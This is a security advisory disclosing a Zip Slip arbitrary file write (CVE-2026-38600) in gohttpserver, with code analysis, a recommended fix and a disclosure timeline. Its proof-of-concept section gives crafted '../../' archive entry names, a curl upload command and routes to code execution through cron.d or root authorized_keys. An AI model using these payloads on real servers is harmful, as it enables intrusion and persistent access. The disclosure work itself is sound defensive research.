# VDR-001: Zip Slip - Arbitrary File Write in gohttpserver

- **Target**: [codeskyblue/gohttpserver](https://github.com/codeskyblue/gohttpserver)
- **Severity**: Critical (CVSS 3.1: 9.1)
- **CWE**: [CWE-22](https://cwe.mitre.org/data/definitions/22.html) - Path Traversal
- **CVE**: [CVE-2026-38600](https://www.cve.org/CVERecord?id=CVE-2026-38600)
- **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
- **Discovered**: 2026-03-19
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

The upload endpoint in `gohttpserver` (all versions through v1.3.0) allows an attacker to write arbitrary files to any location on the host filesystem by uploading a crafted ZIP archive with the `unzip=true` parameter. The `sanitizedName()` function in `zip.go` does not reject `..` path-traversal sequences, and `unzipFile()` does not validate that the joined extraction path remains within the destination directory. When upload is enabled (the `--upload` flag or `upload: true` in `.ghs.yml`, a very common deployment), this is reachable without authentication.

This directly leads to Remote Code Execution by overwriting system-level files such as cron jobs, SSH `authorized_keys`, or the application's own code/static assets.

## Affected Component

- `zip.go:24-33` - `sanitizedName()` strips a leading `/` and runs `filepath.Clean()` but does **not** remove `..` components from a relative path.
- `zip.go:135-188` - `unzipFile()` joins the sanitized entry name onto the destination with `filepath.Join(dest, filename)` (`zip.go:158`) and writes to it (`zip.go:176`) with **no containment check**.
- `httpstaticserver.go:200-301` - `hUploadOrMkdir()` is the HTTP entry point; when `req.FormValue("unzip") == "true"` (`httpstaticserver.go:283`) it calls `unzipFile(dstPath, dirpath)` (`httpstaticserver.go:284`).

## Details

### Source -> sink path

1. `POST /{path}` is routed to `hUploadOrMkdir` (`httpstaticserver.go:111`).
2. The handler stores the uploaded multipart file, then, if `unzip=true`, calls the extractor:

```go
// httpstaticserver.go:283-285
if req.FormValue("unzip") == "true" {
    err = unzipFile(dstPath, dirpath)
    os.Remove(dstPath)
```

Note that `dirpath` is the directory currently being browsed (the served root or a sub-folder) and becomes the extraction `dest`.

3. Inside the extractor, each archive entry name is passed through `sanitizedName()` and then joined onto `dest`:

```go
// zip.go:146-188 (unzipFile) - abridged to the relevant lines
for _, f := range zr.File {
    rc, err := f.Open()
    ...
    filename := sanitizedName(f.Name)                 // zip.go:154
    if filepath.Base(filename) == ".ghs.yml" {        // zip.go:155 (only blocks this one name)
        continue
    }
    fpath := filepath.Join(dest, filename)            // zip.go:158  <-- traversal collapses here
    ...
    os.MkdirAll(filepath.Dir(fpath), os.ModePerm)     // zip.go:175  creates parent dirs anywhere
    outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode()) // zip.go:176
    ...
    _, err = io.Copy(outFile, rc)                     // zip.go:180  writes attacker content
}
```

### Why the guard is missing

The only sanitization is `sanitizedName()`:

```go
// zip.go:24-33
func sanitizedName(filename string) string {
    if len(filename) > 1 && filename[1] == ':' &&
        runtime.GOOS == "windows" {
        filename = filename[2:]
    }
    filename = strings.TrimLeft(strings.Replace(filename, `\`, "/", -1), `/`)
    filename = filepath.ToSlash(filename)
    filename = filepath.Clean(filename)
    return filename
}
```

This function:

- strips a Windows drive prefix (`C:`),
- replaces `\` with `/` and `strings.TrimLeft`s **leading** slashes (so an absolute path like `/etc/passwd` is neutralised into the relative `etc/passwd`),
- runs `filepath.Clean()`.

The critical flaw is that `filepath.Clean()` **does not remove leading `..` segments from a relative path** - by design, `Clean("../../etc/cron.d/x")` returns `"../../etc/cron.d/x"`. Those `..` then survive into `filepath.Join(dest, ...)` (`zip.go:158`), which resolves them and produces a path **outside** `dest`. There is no check after the join that `fpath` is still prefixed by `dest`, which is the canonical Zip Slip defence.

The upload handler's own filename guard, `checkFilename()` (`httpstaticserver.go:818-823`), rejects `\ / : * < > |` - but it is applied only to the **outer** multipart filename (`httpstaticserver.go:243`), never to the names of entries **inside** the ZIP. The archive entries bypass it entirely.

### Drift vs. the original notes

Confirmed against the live source at commit `c33d446` (latest `master`, which is past v1.3.0). One refinement to the original notes: `sanitizedName()` does neutralise *absolute* paths (leading `/` is trimmed, so `/etc/passwd` cannot be hit directly), but it does **not** neutralise *relative* `../` traversal, which is the exploitable primitive. The PoC therefore uses `../../...` relative entries, not absolute paths.

A second nuance: `unzipFile` only writes ZIP entries; it skips an entry whose basename is exactly `.ghs.yml` (`zip.go:155`), but this is irrelevant to the traversal and does not constrain the attacker's choice of target filename.

## Proof of Concept

Fully reproduced end-to-end against the real `gohttpserver` binary built from source (commit `c33d446`, Go 1.26.1, Windows). The PoC starts the server with `--upload`, uploads a malicious archive to a sub-folder with `unzip=true`, and verifies a file is written into a **sibling directory outside the served root**.

### Step 1 - prove `sanitizedName` keeps `..` (root-cause micro-harness)

An exact copy of `sanitizedName()` from `zip.go:24-33` is driven with traversal inputs (`poc/VDR-001/cleantest_main.go`, output saved in `poc/VDR-001/OUTPUT_sanitizedName.txt`):

```
GOOS=windows  dest="/srv/ghs/uploads"

entry="../../etc/cron.d/pwn"             -> sanitized="..\..\etc\cron.d\pwn"          -> Join(dest)="/srv/etc/cron.d/pwn"            escapes_dest=true
entry="../../../../../../etc/cron.d/pwn" -> sanitized="..\..\..\..\..\..\etc\cron.d\pwn" -> Join(dest)="/etc/cron.d/pwn"             escapes_dest=true
entry="/etc/passwd"                      -> sanitized="etc\passwd"                     -> Join(dest)="/srv/ghs/uploads/etc/passwd"   escapes_dest=false
entry="..\..\Windows\Temp\pwn"           -> sanitized="..\..\Windows\Temp\pwn"         -> Join(dest)="/srv/Windows/Temp/pwn"         escapes_dest=true
entry="normal/file.txt"                  -> sanitized="normal\file.txt"                -> Join(dest)="/srv/ghs/uploads/normal/file.txt" escapes_dest=false
```

`escapes_dest=true` for every `../`-based entry confirms the guard is ineffective against relative traversal.

### Step 2 - craft the malicious archive

`poc/VDR-001/make_zipslip.go` writes a ZIP whose single entry name is a traversal string (UTF-8 flag set so gohttpserver does not run its GBK decoder over it):

```
[+] wrote .../zipslip.zip with malicious entry name: "../../SECRET_OUTSIDE/PWNED_BY_CVE-2026-38600.txt"
File Name                                             Modified             Size
../../SECRET_OUTSIDE/PWNED_BY_CVE-2026-38600.txt 1980-00-00 00:00:00          134
```

### Step 3 - upload to the running server and verify out-of-root write

Layout: served root = `served_root/`, upload target = `served_root/sub/`, and a sibling `SECRET_OUTSIDE/` directory that must NOT be reachable through the web root. The entry `../../SECRET_OUTSIDE/...` escapes both `sub/` and `served_root/`.

Real captured output (`poc/VDR-001/OUTPUT.txt`, produced by `poc/VDR-001/run_poc.ps1`):

```
[2] Starting gohttpserver --upload on :18600 (root=served_root)...
    gohttpserver PID=33572

[3] Pre-check: does out-of-root target exist BEFORE upload?
    Test-Path '...\SECRET_OUTSIDE\PWNED_BY_CVE-2026-38600.txt' = False

[4] Uploading zip to /sub/ with unzip=true (via curl.exe multipart) ...
    server response: {"description":"success","success":true}  HTTP_STATUS:200

[5] Post-check: did the file land OUTSIDE the served root?
    [PROVEN] File written OUTSIDE served_root: ...\SECRET_OUTSIDE\PWNED_BY_CVE-2026-38600.txt
    ---- file contents ----
    PWNED via Zip Slip - CVE-2026-38600 (gohttpserver)
    If you can read this from OUTSIDE the served root, arbitrary file write is proven.
    -----------------------

RESULT: ZIP SLIP CONFIRMED - arbitrary file write outside destination.
```

The HTTP request issued was equivalent to:

```bash
curl -s -F 'file=@zipslip.zip;type=application/zip' -F 'unzip=true' \
     'http://TARGET:8000/sub/'
```

The server returned `{"success":true}` and the attacker-controlled file appeared in `SECRET_OUTSIDE/`, a directory that is a sibling of - and not served by - the web root. Pre-check confirmed the file did not exist beforehand.

### Path to RCE

By choosing the entry name, the same primitive writes to any path the server process can write to, for example:

- `../../../../etc/cron.d/ghs` - command execution as the cron user (Linux).
- `../../../../root/.ssh/authorized_keys` - persistent SSH access (if running as root).
- `../<app-dir>/...` - overwrite the application's own static assets/templates to plant stored XSS or backdoors.

The write happens with `f.Mode()` taken from the ZIP entry (`zip.go:176`), so the attacker also controls the resulting file mode.

## Impact

- **Arbitrary file write** to any location writable by the gohttpserver process, with attacker-controlled contents and file mode.
- **Remote Code Execution** via well-known file-write-to-exec primitives (cron, `authorized_keys`, overwriting app code).
- When upload is enabled without per-user ACLs (the documented default behaviour of `--upload`), **no authentication is required**.

## Recommendation

Enforce destination containment after the join, and reject traversal entries. Minimal fix in `unzipFile()` (`zip.go`):

```go
fpath := filepath.Join(dest, filename)
// Containment check: the cleaned target must stay within dest.
cleanDest := filepath.Clean(dest) + string(os.PathSeparator)
if !strings.HasPrefix(filepath.Clean(fpath)+string(os.PathSeparator), cleanDest) {
    return fmt.Errorf("zip slip detected, entry escapes destination: %q", f.Name)
}
```

Additionally, `sanitizedName()` should drop any path that still contains `..` after cleaning. The community fix in fork PR #233 addresses this class of issue; upstream is unmaintained.

## Status

| Date | Event |
|------|-------|
| 2026-03-19 | Vulnerability discovered and confirmed with working PoC |
| 2026-03-19 | Report submitted via GitHub issue requesting Private Vulnerability Reporting |
| 2026-03-19 | Maintainer notified via direct email |
| 2026-04-13 | Public technical disclosure on issue #232 (no maintainer response) |
| 2026-04-13 | Community fix in fork: [PR #233](https://github.com/codeskyblue/gohttpserver/pull/233) |
| 2026-04-14 | CVE-2026-38600 assigned by MITRE |
| 2026-06-05 | Full technical advisory published (coordinated-disclosure window elapsed; upstream unmaintained) |
| - | Upstream maintainer: no response, project unmaintained |

## References

- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Snyk: Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
- [Upstream repository: codeskyblue/gohttpserver](https://github.com/codeskyblue/gohttpserver)
- [Public disclosure: issue #232](https://github.com/codeskyblue/gohttpserver/issues/232)
- [Community fix: PR #233](https://github.com/codeskyblue/gohttpserver/pull/233)
